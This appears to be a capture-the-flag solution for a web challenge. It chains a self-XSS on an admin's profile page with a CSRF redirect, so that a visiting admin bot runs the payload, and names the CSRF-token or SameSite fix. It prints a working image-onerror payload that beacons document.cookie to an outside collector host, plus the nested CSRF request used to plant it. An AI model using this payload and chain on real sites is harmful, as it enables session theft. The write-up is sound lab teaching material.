Full chain. The self-XSS payload (runs when the admin's own `/profile` renders it):

```html
<img
  src="x"
  onerror="new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)"
/>
```

Build the nested CSRF URL — the update URL (with the payload URL-encoded), then the
attacker `/go?to=` wrapping it (URL-encoded again; the `+` operator must survive as
`%2B`, so encode fully):

```
POST /report
Content-Type: application/json

{"url":"http://attacker:8080/go?to=<url-enc(http://app:8080/profile/update?bio=<url-enc(PAYLOAD)>)>"}
```

The bot visits the attacker page → meta-refresh to `/profile/update` (top-level GET
carries its Lax admin cookie) → bio set → 302 `/profile` → the raw bio runs in the
admin's session → beacon. Read it and submit:

```
GET  /oob/received        # item path like /report?c=session%3D<32 hex>

POST /solve
Content-Type: application/json

{"c":"<32 hex>"}
```

→ `FLAG{…}`. `tests/exploit.py` runs the whole flow and asserts `/profile` is 403
for you and `/u/admin` is escaped — proving the self-XSS is genuinely self-only and
the CSRF chain is the only way to fire it. Fix: a CSRF token (or `SameSite=Strict`)
on the update, and encode the bio on `/profile` too.
